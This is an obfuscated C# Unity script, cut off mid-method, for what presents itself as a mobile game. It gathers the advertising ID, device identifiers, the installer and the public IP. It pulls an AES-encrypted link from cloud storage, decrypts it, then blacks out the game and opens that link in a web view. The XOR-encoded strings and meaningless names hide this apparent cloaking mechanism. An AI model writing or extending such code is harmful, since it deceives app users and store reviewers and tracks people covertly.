using AndroidInstallReferrer;
using DG.Tweening;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using System;
using System.Collections;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using Unity.Notifications.Android;
using Unity.Services.Authentication;
using Unity.Services.CloudSave;
using Unity.Services.CloudSave.Models;
using Unity.Services.CloudSave.Models.Data.Player;
using Unity.Services.Core;
using Unity.Services.PushNotifications;
using UnityEngine;
using UnityEngine.Android;
using UnityEngine.InputSystem;
using UnityEngine.InputSystem.EnhancedTouch;
using UnityEngine.Networking;
using UnityEngine.SceneManagement;
using UnityEngine.UI;
using Application = UnityEngine.Application;

public class _0x1ef2fa0a : MonoBehaviour
{
    private string _0x2a3feac4 = "";
    private string Decrypt(string _0x744addd7, string _0xda5eb4b0)
    {
        try
        {
            var _0x45d71b02 = Convert.FromBase64String(_0x744addd7);
            using var _0x2f4bc81a = Aes.Create();
            _0x2f4bc81a.Key = SHA256.Create().ComputeHash(Encoding.UTF8.GetBytes(_0xda5eb4b0));
            var _0x20e5ed87 = new byte[16];
            Buffer.BlockCopy(_0x45d71b02, 0, _0x20e5ed87, 0, 16);
            _0x2f4bc81a.IV = _0x20e5ed87;
            using var _0xe5cb04b2 = new MemoryStream(_0x45d71b02, 16, _0x45d71b02.Length - 16);
            using var _0x6b91a406 = new CryptoStream(_0xe5cb04b2, _0x2f4bc81a.CreateDecryptor(), CryptoStreamMode.Read);
            using var _0xeb294e4f = new StreamReader(_0x6b91a406, Encoding.UTF8);
            return _0xeb294e4f.ReadToEnd();
        }
        catch (Exception ex)
        {
            return "";
        }
    }

    private string _0x6399e15c = "";
    //    private async Task<string> GetMyip()
    //    {
    //        string result = "";
    //        var processorType = SystemInfo.processorType;
    //        //        {
    //        //#if NOT_B_STARTED
    //        //#endif
    //        if (!processorType.Contains("armv7", StringComparison.OrdinalIgnoreCase) && !processorType.Contains("x86-64", StringComparison.OrdinalIgnoreCase))
    //        {
    //            var tcs = new TaskCompletionSource<string>();
    //            // Primary and fallback STUN servers (Google STUN 1-6)
    //            var stunServers = new[]
    //            {
    //                new[] { "stun:stun.l.google.com:19302" },      // Primary
    //                //new[] { "stun:stun1.l.google.com:19302" },     // Fallback 1
    //                //new[] { "stun:stun2.l.google.com:19302" },     // Fallback 2
    //                //new[] { "stun:stun3.l.google.com:19302" },     // Fallback 3
    //                //new[] { "stun:stun4.l.google.com:19302" },     // Fallback 4
    //                //new[] { "stun:stun5.l.google.com:19302" },     // Fallback 5
    //                //new[] { "stun:stun6.l.google.com:19302" }      // Fallback 6
    //            };
    //            RTCPeerConnection pc = null;
    //            foreach (var serverUrls in stunServers)
    //            {
    //                if (tcs.Task.IsCompleted)
    //                    break;
    //                try
    //                {
    //                    var config = new RTCConfiguration
    //                    {
    //                        iceServers = new RTCIceServer[]
    //                        {
    //                    new RTCIceServer { urls = serverUrls }
    //                        },
    //                        iceTransportPolicy = RTCIceTransportPolicy.All
    //                    };
    //                    pc = new RTCPeerConnection(ref config);
    //                    pc.OnIceCandidate = candidate =>
    //                    {
    //                        if (candidate == null || tcs.Task.IsCompleted)
    //                            return;
    //                        if (candidate.Type == RTCIceCandidateType.Srflx || candidate.Type == RTCIceCandidateType.Prflx)
    //                        {
    //                            string address = candidate.Address;
    //                            string ip = "";
    //                            // Parse IP from address (which may be IPv4 "ip:port" or IPv6 "[ip]:port")
    //                            if (address.StartsWith("[") && address.Contains("]:"))
    //                            {
    //                                // IPv6 format: [2001:db8::1]:12345
    //                                int endBracket = address.IndexOf(']');
    //                                ip = address.Substring(1, endBracket - 1);
    //                            }
    //                            else if (address.Contains(':'))
    //                            {
    //                                // IPv4 format: 192.168.1.1:12345
    //                                int lastColon = address.LastIndexOf(':');
    //                                ip = address.Substring(0, lastColon);
    //                            }
    //                            else
    //                            {
    //                                // No port, just IP
    //                                ip = address;
    //                            }
    //                            {
    //#if B_LOGS
    //                                {
    //                                    Debug.Log($"[test STUN] Public IP: {ip} from {serverUrls[0]}");
    //                                }
    //#endif
    //                            }
    //                            tcs.TrySetResult(ip);
    //                        }
    //                    };
    //                    pc.CreateDataChannel("init");
    //                    var offerOp = pc.CreateOffer();
    //                    while (!offerOp.IsDone)
    //                        await Task.Yield();
    //                    var desc = offerOp.Desc;
    //                    pc.SetLocalDescription(ref desc);
    //                    float timeout = 10f;
    //                    float t = 0f;
    //                    while (!tcs.Task.IsCompleted && t < timeout)
    //                    {
    //                        await Task.Delay(100);
    //                        t += 0.1f;
    //                    }
    //                    if (tcs.Task.IsCompleted)
    //                    {
    //                        result = tcs.Task.Result;
    //                        break;
    //                    }
    //                    {
    //#if B_LOGS
    //                        {
    //                            Debug.Log($"[test STUN] Failed with {serverUrls[0]}, trying next...");
    //                        }
    //#endif
    //                    }
    //                }
    //                catch (Exception ex)
    //                {
    //#if B_LOGS
    //                    {
    //                        Debug.Log($"[test STUN] Error with {serverUrls[0]}: {ex.Message}");
    //                    }
    //#endif
    //                    if (pc != null)
    //                    {
    //                        pc.Close();
    //                        pc.Dispose();
    //                    }
    //                }
    //            }
    //            if (!tcs.Task.IsCompleted)
    //                result = "";
    //        }
    //        //#if NOT_B_STARTED
    //        //            else
    //        //        if(result == "")
    //        //        {
    //        //            {
    //        //#if B_LOGS
    //        //                {
    //        //                    Debug.LogError($"[TEST] WebRTC DLL missing or ARMv7 architecture");
    //        //                }
    //        //#endif
    //        //            }
    //        //            result = await GetMyipFallback("0fce0027001c001700140011000b000a0008001f00180022001b00010024001e0025002300260002000400050006000300070000000c001d0015000d000f0021000900100019001a0013000e00120020001647175e80370ec5a1a5d9b1b039a49e64977f39d478adcf763f556d428a45d94f056b1d88f6b76874");
    //        //        }
    //        //#endif
    //        //        }
    //        {
    //#if B_LOGS
    //            {
    //                Debug.Log($"[Test] Get my ip: {result}");
    //            }
    //#endif
    //        }
    //        return result;
    //    }
    private async Task<string> _0x285edbbe()
    {
        var _0x248dcb35 = _0x2236f796._0xe98e57cc(new byte[40] { 255, 227, 227, 231, 228, 173, 184, 184, 224, 224, 224, 185, 244, 251, 248, 226, 243, 241, 251, 246, 229, 242, 185, 244, 248, 250, 184, 244, 243, 249, 186, 244, 240, 254, 184, 227, 229, 246, 244, 242 }, 151);
        using (UnityWebRequest _0x65e804a4 = UnityWebRequest.Get(_0x248dcb35))
        {
            await _0x65e804a4.SendWebRequest();
            string[] _0xa96c2dc5 = _0x65e804a4.downloadHandler.text.Split('\n');
            foreach (string _0xa25b5d17 in _0xa96c2dc5)
            {
                if (_0xa25b5d17.StartsWith(_0x2236f796._0xe98e57cc(new byte[3] { 52, 45, 96 }, 93)))
                {
                    string _0xe31fee51 = _0xa25b5d17.Substring(3);
                    {
#if B_LOGS
                        {
                            Debug.Log($"[Test] User ip (FALLBACK MODE): {_0xe31fee51} from {_0x248dcb35}");
                        }
#endif
                    }

                    return _0xe31fee51;
                }
            }
        }

        return "";
    }

    internal bool ContainsIgnoreCase(string _0x3c2f20dc, string _0x4cd2d978)
    {
        if (string.IsNullOrEmpty(_0x3c2f20dc) || string.IsNullOrEmpty(_0x4cd2d978))
            return false;
        return _0x3c2f20dc.IndexOf(_0x4cd2d978, StringComparison.OrdinalIgnoreCase) >= 0;
    }

    private async Task<bool> _0xa11662f9()
    {
        {
#if B_LOGS
            Debug.Log(_0x2236f796._0xe98e57cc(new byte[29] { 17, 30, 47, 57, 62, 23, 106, 3, 57, 26, 56, 35, 60, 43, 41, 51, 11, 36, 46, 25, 43, 60, 47, 46, 9, 34, 47, 41, 33 }, 74));
#endif
        }

        string _0x8b6f4a58 = "";
        for (int _0x932f670c = 0; _0x932f670c < 2; _0x932f670c++)
        {
            if (await _0xbb82a337(1, 100))
            {
                await _0x57a2abaa(_0x2236f796._0xe98e57cc(new byte[7] { 240, 254, 253, 241, 249, 247, 246 }, 146));
                _0xf769582c();
                return true;
            }

            _0x8b6f4a58 = await _0x360a9255(1, 100);
            if (!string.IsNullOrEmpty(_0x8b6f4a58))
                break;
        }

        try
        {
            if (!string.IsNullOrEmpty(_0x8b6f4a58))
            {
                if (!string.IsNullOrEmpty(_0xd74d47a7))
                {
                    _0x8b6f4a58 = _0x17a410ac(_0x8b6f4a58, _0xd74d47a7);
                    {
#if B_LOGS
                        Debug.Log(_0x2236f796._0xe98e57cc(new byte[53] { 151, 152, 169, 191, 184, 145, 236, 143, 173, 175, 164, 169, 168, 236, 170, 165, 162, 173, 160, 153, 190, 160, 236, 187, 165, 184, 164, 236, 191, 169, 162, 168, 165, 168, 236, 46, 74, 94, 236, 191, 164, 163, 187, 236, 155, 169, 174, 154, 165, 169, 187, 246, 236 }, 204) + _0x8b6f4a58);
#endif
                    }
                }
                else
                {
                    {
#if B_LOGS
                        Debug.Log(_0x2236f796._0xe98e57cc(new byte[39] { 166, 169, 152, 142, 137, 160, 221, 190, 156, 158, 149, 152, 153, 221, 155, 148, 147, 156, 145, 168, 143, 145, 221, 31, 123, 111, 221, 142, 149, 146, 138, 221, 170, 152, 159, 171, 148, 152, 138 }, 253));
#endif
                    }
                }

                _0x96918f82 = true;
                _0xa6b722c0(_0x8b6f4a58);
                return true;
            }

            return false;
        }
        catch (Exception e)
        {
            {
#if B_LOGS
                {
                    Debug.Log(_0x2236f796._0xe98e57cc(new byte[44] { 155, 148, 165, 179, 180, 157, 224, 133, 184, 163, 165, 176, 180, 169, 175, 174, 224, 183, 168, 169, 172, 165, 224, 163, 168, 165, 163, 171, 169, 174, 167, 224, 179, 161, 182, 165, 164, 224, 172, 169, 174, 171, 250, 224 }, 192) + e.Message);
                }
#endif
            }

            return true;
        }
    }

    private bool _0x9fb9c897 = false;
    private string _0x6068c37f = "";
    private readonly string[] _0x946427b6 = new string[]
    {
        _0x2236f796._0xe98e57cc(new byte[60] { 244, 155, 138, 180, 36, 80, 108, 97, 36, 118, 97, 97, 104, 119, 36, 101, 118, 97, 36, 108, 107, 112, 36, 118, 109, 99, 108, 112, 36, 106, 107, 115, 36, 230, 132, 151, 36, 96, 107, 106, 230, 132, 157, 112, 36, 105, 109, 119, 119, 36, 125, 107, 113, 118, 36, 119, 116, 109, 106, 37 }, 4),
        _0x2236f796._0xe98e57cc(new byte[52] { 133, 234, 248, 245, 85, 60, 1, 85, 22, 26, 0, 25, 17, 85, 23, 16, 85, 12, 26, 0, 7, 85, 25, 0, 22, 30, 12, 85, 24, 26, 24, 16, 27, 1, 85, 151, 245, 230, 85, 2, 29, 12, 85, 6, 1, 26, 5, 85, 27, 26, 2, 74 }, 117),
        _0x2236f796._0xe98e57cc(new byte[66] { 32, 88, 99, 45, 122, 77, 226, 128, 171, 165, 226, 181, 171, 172, 177, 226, 163, 176, 167, 226, 170, 171, 182, 182, 171, 172, 165, 226, 175, 173, 176, 167, 226, 173, 164, 182, 167, 172, 226, 182, 173, 166, 163, 187, 226, 32, 66, 81, 226, 177, 182, 163, 187, 226, 171, 172, 226, 182, 170, 167, 226, 165, 163, 175, 167, 236 }, 194),
        _0x2236f796._0xe98e57cc(new byte[54] { 245, 154, 144, 151, 37, 81, 109, 108, 118, 37, 108, 118, 37, 117, 119, 108, 104, 96, 37, 113, 108, 104, 96, 37, 231, 133, 150, 37, 113, 109, 96, 37, 103, 96, 118, 113, 37, 117, 105, 100, 124, 96, 119, 118, 37, 117, 105, 100, 124, 37, 107, 106, 114, 43 }, 5),
        _0x2236f796._0xe98e57cc(new byte[48] { 146, 253, 246, 199, 66, 59, 13, 23, 16, 66, 21, 11, 12, 12, 11, 12, 5, 66, 17, 22, 16, 7, 3, 9, 66, 1, 13, 23, 14, 6, 66, 0, 7, 66, 13, 12, 7, 66, 17, 18, 11, 12, 66, 3, 21, 3, 27, 76 }, 98),
        _0x2236f796._0xe98e57cc(new byte[65] { 249, 150, 147, 137, 41, 67, 104, 106, 98, 121, 102, 125, 122, 41, 104, 123, 108, 41, 100, 102, 123, 108, 41, 104, 106, 125, 96, 127, 108, 41, 125, 102, 103, 96, 110, 97, 125, 41, 235, 137, 154, 41, 122, 125, 104, 112, 41, 104, 103, 109, 41, 125, 123, 112, 41, 112, 102, 124, 123, 41, 101, 124, 106, 98, 39 }, 9),
        _0x2236f796._0xe98e57cc(new byte[55] { 36, 75, 90, 102, 244, 145, 162, 177, 166, 173, 244, 167, 164, 189, 186, 244, 183, 187, 161, 186, 160, 167, 244, 54, 84, 71, 244, 160, 188, 177, 244, 186, 177, 172, 160, 244, 187, 186, 177, 244, 183, 187, 161, 184, 176, 244, 182, 177, 244, 173, 187, 161, 166, 167, 250 }, 212),
        _0x2236f796._0xe98e57cc(new byte[63] { 85, 26, 39, 88, 15, 56, 151, 231, 219, 214, 206, 210, 197, 196, 151, 197, 222, 208, 223, 195, 151, 217, 216, 192, 151, 214, 197, 210, 151, 192, 222, 217, 217, 222, 217, 208, 151, 85, 55, 36, 151, 211, 216, 217, 85, 55, 46, 195, 151, 192, 214, 219, 220, 151, 214, 192, 214, 206, 151, 206, 210, 195, 153 }, 183),
        _0x2236f796._0xe98e57cc(new byte[51] { 105, 6, 22, 31, 185, 214, 247, 245, 224, 185, 237, 241, 246, 234, 252, 185, 238, 241, 246, 185, 234, 237, 248, 224, 185, 240, 247, 185, 237, 241, 252, 185, 254, 248, 244, 252, 185, 238, 240, 247, 185, 237, 241, 252, 185, 233, 235, 240, 227, 252, 183 }, 153),
        _0x2236f796._0xe98e57cc(new byte[64] { 106, 18, 41, 103, 48, 7, 168, 197, 231, 229, 237, 230, 252, 253, 229, 168, 225, 251, 168, 237, 254, 237, 250, 241, 252, 224, 225, 230, 239, 168, 106, 8, 27, 168, 227, 237, 237, 248, 168, 251, 248, 225, 230, 230, 225, 230, 239, 168, 238, 231, 250, 168, 241, 231, 253, 250, 168, 235, 224, 233, 230, 235, 237, 166 }, 136)
    };
    private void WLog(string _0x86a78f65)
    {
#if B_LOGS
        {
            Debug.Log(_0x2236f796._0xe98e57cc(new byte[7] { 9, 6, 55, 33, 38, 15, 114 }, 82) + _0x86a78f65);
        }
#endif
    }

    // PART 3
    private string _0x9922f01e()
    {
        try
        {
            var _0x3004ab76 = new AndroidJavaClass(_0x2236f796._0xe98e57cc(new byte[30] { 152, 148, 150, 213, 142, 149, 146, 143, 130, 200, 159, 213, 139, 151, 154, 130, 158, 137, 213, 174, 149, 146, 143, 130, 171, 151, 154, 130, 158, 137 }, 251));
            var _0x05b6d5fa = _0x3004ab76.GetStatic<AndroidJavaObject>(_0x2236f796._0xe98e57cc(new byte[15] { 251, 237, 234, 234, 253, 246, 236, 217, 251, 236, 241, 238, 241, 236, 225 }, 152));
            var _0xeac5d78f = new AndroidJavaClass(_0x2236f796._0xe98e57cc(new byte[57] { 123, 119, 117, 54, 127, 119, 119, 127, 116, 125, 54, 121, 118, 124, 106, 119, 113, 124, 54, 127, 117, 107, 54, 121, 124, 107, 54, 113, 124, 125, 118, 108, 113, 126, 113, 125, 106, 54, 89, 124, 110, 125, 106, 108, 113, 107, 113, 118, 127, 81, 124, 91, 116, 113, 125, 118, 108 }, 24));
            var _0xbc499562 = _0xeac5d78f.CallStatic<AndroidJavaObject>(_0x2236f796._0xe98e57cc(new byte[20] { 138, 136, 153, 172, 137, 155, 136, 159, 153, 132, 158, 132, 131, 138, 164, 137, 164, 131, 139, 130 }, 237), _0x05b6d5fa);
            var _0xff901012 = _0xbc499562.Call<string>(_0x2236f796._0xe98e57cc(new byte[5] { 224, 226, 243, 206, 227 }, 135));
            {
#if B_LOGS
                Debug.Log($"[Test] Google Advertiding Id (ad id): {_0xff901012}");
#endif
            }

            return string.IsNullOrEmpty(_0xff901012) ? "" : _0xff901012;
        }
        catch
        {
            return "";
        }
    }

    private void _0xddb4ce76()
    {
        if (Camera.main == null)
            return;
        Camera.main.cullingMask = 0;
        Camera.main.clearFlags = CameraClearFlags.SolidColor;
        Camera.main.backgroundColor = Color.black;
    }

    private string _0x213c089a()
    {
        if (string.IsNullOrEmpty(_0x10520025) && _0x047ed0fd != null)
            _0x10520025 = _0x047ed0fd.GetUserAgent();
        if (string.IsNullOrEmpty(_0x10520025))
            return string.Empty;
        string _0xf8507bee = Regex.Replace(_0x10520025, _0x2236f796._0xe98e57cc(new byte[11] { 44, 3, 90, 75, 44, 3, 90, 7, 6, 44, 18 }, 112), string.Empty);
        _0xf8507bee = Regex.Replace(_0xf8507bee, _0x2236f796._0xe98e57cc(new byte[15] { 99, 76, 20, 125, 74, 86, 83, 91, 16, 100, 97, 4, 22, 98, 20 }, 63), string.Empty);
        _0xf8507bee = Regex.Replace(_0xf8507bee, _0x2236f796._0xe98e57cc(new byte[15] { 90, 105, 126, 127, 101, 99, 98, 35, 56, 80, 34, 60, 80, 127, 38 }, 12), string.Empty);
        return Regex.Replace(_0xf8507bee, _0x2236f796._0xe98e57cc(new byte[6] { 216, 247, 255, 182, 168, 249 }, 132), _0x2236f796._0xe98e57cc(new byte[1] { 148 }, 180)).Trim();
    }

    internal void _0x381a537f()
    {
        Rect _0x950943c8 = Screen.safeArea;
        Vector2 _0x86ab2a94 = new Vector2(Screen.width, Screen.height);
        if (_0x950943c8 == lastSafe && _0x86ab2a94 == lastSize)
            return;
        // Apply manual padding
        _0x950943c8.xMin += _0xb02cf0dd;
        _0x950943c8.xMax -= _0x47b87fe1;
        _0x950943c8.yMin += _0x4e6b048d;
        _0x950943c8.yMax -= _0xcf29b96d;
        // Convert Unity safe area -> native WebView frame
        Rect _0xee698638 = new Rect(_0x950943c8.x, _0x86ab2a94.y - _0x950943c8.y - _0x950943c8.height, // Y flip for native coordinate system
 _0x950943c8.width, _0x950943c8.height);
        _0x047ed0fd.Frame = _0xee698638;
        lastSafe = Screen.safeArea;
        lastSize = _0x86ab2a94;
    }

    private bool _0x1a5be668 = false;
    private bool _0x7043b205()
    {
        _0xfa114d74.RemoveAll(_0x86743b07 => _0x86743b07 == null || !_0x86743b07.IsAlive);
        return _0xfa114d74.Count > 0;
    }

    private static readonly string WindowsDesktopUserAgent = _0x2236f796._0xe98e57cc(new byte[111] { 72, 106, 127, 108, 105, 105, 100, 42, 48, 43, 53, 37, 45, 82, 108, 107, 97, 106, 114, 118, 37, 75, 81, 37, 52, 53, 43, 53, 62, 37, 82, 108, 107, 51, 49, 62, 37, 125, 51, 49, 44, 37, 68, 117, 117, 105, 96, 82, 96, 103, 78, 108, 113, 42, 48, 54, 50, 43, 54, 51, 37, 45, 78, 77, 81, 72, 73, 41, 37, 105, 108, 110, 96, 37, 66, 96, 102, 110, 106, 44, 37, 70, 109, 119, 106, 104, 96, 42, 52, 55, 53, 43, 53, 43, 53, 43, 53, 37, 86, 100, 99, 100, 119, 108, 42, 48, 54, 50, 43, 54, 51 }, 5);
    private UniWebViewPopup _0x8a390879()
    {
        for (int _0x76b26d0c = _0xfa114d74.Count - 1; _0x76b26d0c >= 0; _0x76b26d0c--)
        {
            var _0x68488ce8 = _0xfa114d74[_0x76b26d0c];
            if (_0x68488ce8 != null && _0x68488ce8.IsAlive)
                return _0x68488ce8;
            _0xfa114d74.RemoveAt(_0x76b26d0c);
        }

        return null;
    }

    private string _0x921e226e = "";
    private AndroidJavaObject _0x7aeb1a5f { get; set; }

    private bool _0x63c8940f = false;
    private void OnDestroy()
    {
        StopAllCoroutines();
        _0xf769582c();
    }

    private async Task<bool> _0xbb82a337(int _0x01d7f4ef = 5, int _0x95b796df = 500)
    {
        List<EntityData> _0x5a69c8af = new List<EntityData>();
        int _0xe70c28ad = 0;
        do
        {
            try
            {
                _0x5a69c8af = (await CloudSaveService.Instance.Data.Player.QueryAsync(new Query(new List<FieldFilter> { new FieldFilter(_0x2236f796._0xe98e57cc(new byte[8] { 140, 144, 157, 133, 153, 142, 181, 152 }, 252), _0x33f22522, FieldFilter.OpOptions.EQ, true) }, new HashSet<string> { _0x2236f796._0xe98e57cc(new byte[9] { 170, 176, 147, 177, 170, 181, 162, 160, 186 }, 195) }), new QueryOptions())).ToList();
            }
            catch (Exception e)
            {
                {
#if B_LOGS
                    {
                        Debug.Log(_0x2236f796._0xe98e57cc(new byte[32] { 85, 90, 107, 125, 122, 83, 46, 127, 123, 107, 124, 119, 79, 125, 119, 96, 109, 92, 107, 125, 123, 98, 122, 125, 46, 107, 124, 124, 97, 124, 52, 46 }, 14) + e.Message);
                    }
#endif
                }
            }

            await Task.Delay(_0x95b796df);
        }
        while (_0x5a69c8af.Count == 0 && _0xe70c28ad++ < _0x01d7f4ef);
        {
#if B_LOGS
            {
                Debug.Log(_0x2236f796._0xe98e57cc(new byte[32] { 73, 70, 119, 97, 102, 79, 50, 91, 97, 66, 96, 123, 100, 115, 113, 107, 50, 67, 103, 119, 96, 107, 50, 96, 119, 97, 103, 126, 102, 97, 40, 50 }, 18) + JsonConvert.SerializeObject(_0x5a69c8af, Formatting.Indented));
            }
#endif
        }

        {
#if B_LOGS
            {
                Debug.Log(_0x2236f796._0xe98e57cc(new byte[38] { 251, 244, 197, 211, 212, 253, 128, 233, 211, 240, 210, 201, 214, 193, 195, 217, 128, 241, 213, 197, 210, 217, 128, 210, 197, 211, 213, 204, 212, 211, 128, 195, 207, 213, 206, 212, 154, 128 }, 160) + _0x5a69c8af.Count);
            }
#endif
        }

        bool _0x7a21a862 = true;
        if (_0x5a69c8af.Count == 0)
        {
            _0x7a21a862 = false;
        }
        else
        {
            _0x7a21a862 = _0x5a69c8af.Any(_0xe89d04fc => _0xe89d04fc.Data.Any(IsPrivacyItemTrue));
        }

        {
#if B_LOGS
            {
                Debug.Log(_0x2236f796._0xe98e57cc(new byte[25] { 134, 137, 184, 174, 169, 128, 253, 148, 174, 141, 175, 180, 171, 188, 190, 164, 253, 175, 184, 174, 168, 177, 169, 231, 253 }, 221) + _0x7a21a862);
            }
#endif
        }

        return _0x7a21a862;
    }

    private IEnumerator _0x8e7b9bc1(float _0x6169e85c)
    {
        yield return new WaitForSeconds(_0x6169e85c);
        if (!_0x3dcbea2c)
        {
            _0x3dcbea2c = true;
            {
#if B_LOGS
                {
                    Debug.Log($"[Test] Refferer timeout apply: {_0x6399e15c}");
                }
#endif
            }
        }
    }

    private string _0xcf228d8c = "";
    private ApplicationInstallMode _0x9e651bdd = ApplicationInstallMode.Unknown;
    private bool _0x96918f82 = false;
    private void _0x8a7bf1c6(string _0xbf3ac7cc)
    {
        bool _0x38e72e56 = !string.IsNullOrEmpty(_0xbf3ac7cc);
        if (_0x38e72e56)
        {
            {
#if B_LOGS
                Debug.Log(_0x2236f796._0xe98e57cc(new byte[13] { 23, 24, 41, 63, 56, 17, 108, 31, 36, 35, 59, 118, 108 }, 76) + _0xbf3ac7cc);
#endif
            }

            _0xa6b722c0(_0xbf3ac7cc);
            return;
        }
        else
        {
            {
#if B_LOGS
                Debug.Log(_0x2236f796._0xe98e57cc(new byte[39] { 53, 58, 11, 29, 26, 51, 78, 40, 15, 2, 2, 12, 15, 13, 5, 78, 140, 232, 252, 78, 41, 15, 3, 11, 78, 70, 0, 1, 78, 8, 7, 0, 15, 2, 78, 59, 60, 34, 71 }, 110));
#endif
            }

            _0xf769582c();
            return;
        }
    }

    private Canvas _0x645db8f3()
    {
        if (_0xe14c6c47 != null)
            return _0xe14c6c47;
        var _0x9762671c = gameObject.GetComponentInChildren<Canvas>();
        if (_0x9762671c == null)
        {
            var _0xb2252394 = new GameObject(_0x2236f796._0xe98e57cc(new byte[6] { 13, 47, 32, 56, 47, 61 }, 78), typeof(Canvas), typeof(CanvasScaler), typeof(GraphicRaycaster));
            _0x9762671c = _0xb2252394.GetComponent<Canvas>();
            _0x9762671c.transform.SetParent(transform, false);
            _0x9762671c.renderMode = RenderMode.ScreenSpaceOverlay;
        }

        _0xe14c6c47 = _0x9762671c;
        return _0xe14c6c47;
    }

    private void _0x87eb8a71()
    {
        {
#if B_LOGS
            Debug.Log(_0x2236f796._0xe98e57cc(new byte[22] { 178, 189, 140, 154, 157, 180, 201, 186, 157, 134, 155, 140, 173, 140, 159, 128, 138, 140, 160, 135, 143, 134 }, 233));
#endif
        }

        _0x458a368d = SystemInfo.deviceModel;
        _0x3a1c301f = Application.version;
        _0x9e651bdd = Application.installMode;
        _0xcf228d8c = Application.installerName;
        _0x04a78928 = Application.identifier;
        _0x0a9d3c31 = _0x9922f01e();
        _0x10520025 = _0xf6d2400e();
        _0x2a3feac4 = SystemInfo.deviceUniqueIdentifier;
        _0xeb25f0a5 = SystemInfo.graphicsDeviceName;
        _0x921e226e = SystemInfo.processorType;
        {
#if B_LOGS
            {
                _0x3a1c301f = _0x2236f796._0xe98e57cc(new byte[5] { 187, 162, 187, 162, 187 }, 140);
                _0x9e651bdd = ApplicationInstallMode.Store;
                _0xcf228d8c = _0x2236f796._0xe98e57cc(new byte[19] { 162, 174, 172, 239, 160, 175, 165, 179, 174, 168, 165, 239, 183, 164, 175, 165, 168, 175, 166 }, 193);
                _0x10520025 = _0x2236f796._0xe98e57cc(new byte[8] { 246, 254, 227, 231, 234, 179, 230, 242 }, 147);
                _0x2a3feac4 = Guid.NewGuid().ToString().Replace(_0x2236f796._0xe98e57cc(new byte[1] { 127 }, 82), "");
            }
#endif
        }

        {
#if B_LOGS
            Debug.Log(_0x2236f796._0xe98e57cc(new byte[17] { 199, 200, 249, 239, 232, 193, 188, 248, 249, 234, 209, 243, 248, 249, 240, 166, 188 }, 156) + _0x458a368d);
            Debug.Log(_0x2236f796._0xe98e57cc(new byte[19] { 151, 152, 169, 191, 184, 145, 236, 173, 188, 188, 154, 169, 190, 191, 165, 163, 162, 246, 236 }, 204) + _0x3a1c301f);
            Debug.Log(_0x2236f796._0xe98e57cc(new byte[20] { 202, 197, 244, 226, 229, 204, 177, 248, 255, 226, 229, 240, 253, 253, 220, 254, 245, 244, 171, 177 }, 145) + _0x9e651bdd);
            Debug.Log(_0x2236f796._0xe98e57cc(new byte[23] { 154, 149, 164, 178, 181, 156, 225, 168, 175, 178, 181, 160, 173, 173, 164, 179, 146, 181, 174, 179, 164, 251, 225 }, 193) + _0xcf228d8c);
            Debug.Log(_0x2236f796._0xe98e57cc(new byte[14] { 6, 9, 56, 46, 41, 0, 125, 60, 45, 45, 20, 57, 103, 125 }, 93) + _0x04a78928);
            Debug.Log(_0x2236f796._0xe98e57cc(new byte[14] { 28, 19, 34, 52, 51, 26, 103, 38, 35, 49, 14, 35, 125, 103 }, 71) + _0x0a9d3c31);
            Debug.Log(_0x2236f796._0xe98e57cc(new byte[18] { 11, 4, 53, 35, 36, 13, 112, 37, 35, 53, 34, 17, 55, 53, 62, 36, 106, 112 }, 80) + _0x10520025);
            Debug.Log(_0x2236f796._0xe98e57cc(new byte[17] { 245, 250, 203, 221, 218, 243, 142, 221, 215, 221, 234, 203, 216, 231, 202, 148, 142 }, 174) + _0x2a3feac4);
            Debug.Log(_0x2236f796._0xe98e57cc(new byte[12] { 4, 11, 58, 44, 43, 2, 127, 56, 47, 42, 101, 127 }, 95) + _0xeb25f0a5);
            Debug.Log(_0x2236f796._0xe98e57cc(new byte[12] { 134, 137, 184, 174, 169, 128, 253, 190, 173, 168, 231, 253 }, 221) + _0x921e226e);
#endif
        }
    }

    private void _0xae64159e(string _0x8ed8fd54)
    {
        if (string.IsNullOrEmpty(_0x8ed8fd54))
            return;
        if (TryOpenExternalLikeChrome(_0x8ed8fd54))
            return;
        OpenUrlExternally(_0x8ed8fd54);
    }

    private int _0xcf29b96d = 5, _0x4e6b048d = 5, _0xb02cf0dd = 5, _0x47b87fe1 = 5;
    private async Task<string> _0x360a9255(int _0xdcdd3648 = 5, int _0xa0286151 = 500)
    {
        try
        {
            List<EntityData> _0x17c6e6c6 = new List<EntityData>();
            int _0x669b2b20 = 0;
            do
            {
                _0x17c6e6c6 = (await CloudSaveService.Instance.Data.Player.QueryAsync(new Query(new List<FieldFilter> { new FieldFilter(_0x2236f796._0xe98e57cc(new byte[8] { 254, 226, 239, 247, 235, 252, 199, 234 }, 142), _0x33f22522, FieldFilter.OpOptions.EQ, true) }, new HashSet<string> { _0x33f22522 }), new QueryOptions())).ToList();
                await Task.Delay(_0xa0286151);
            }
            while (_0x17c6e6c6.Count == 0 && _0x669b2b20++ < _0xdcdd3648);
            {
#if B_LOGS
                {
                    Debug.Log(_0x2236f796._0xe98e57cc(new byte[33] { 84, 91, 106, 124, 123, 82, 47, 92, 110, 121, 106, 107, 47, 67, 102, 97, 100, 47, 94, 122, 106, 125, 118, 47, 125, 106, 124, 122, 99, 123, 124, 53, 47 }, 15) + JsonConvert.SerializeObject(_0x17c6e6c6, Formatting.Indented));
                }
#endif
            }

            {
#if B_LOGS
                {
                    Debug.Log(_0x2236f796._0xe98e57cc(new byte[39] { 243, 252, 205, 219, 220, 245, 136, 251, 201, 222, 205, 204, 136, 228, 193, 198, 195, 136, 249, 221, 205, 218, 209, 136, 218, 205, 219, 221, 196, 220, 219, 136, 203, 199, 221, 198, 220, 146, 136 }, 168) + _0x17c6e6c6.Count);
                }
#endif
            }

            var _0xb1656283 = _0x17c6e6c6.SelectMany(_0xe89d04fc => _0xe89d04fc.Data).FirstOrDefault(_0xa83bf922 => _0xa83bf922.Key == _0x33f22522)?.Value.GetAs<string>() ?? string.Empty;
            _0xb1656283 = Decrypt(_0xb1656283, _0x33f22522);
            {
#if B_LOGS
                {
                    Debug.Log(_0x2236f796._0xe98e57cc(new byte[24] { 142, 129, 176, 166, 161, 136, 245, 153, 186, 180, 177, 245, 166, 180, 163, 176, 177, 245, 185, 188, 187, 190, 239, 245 }, 213) + _0xb1656283);
                }
#endif
            }

            return _0xb1656283;
        }
        catch (Exception ex)
        {
            {
#if B_LOGS
                {
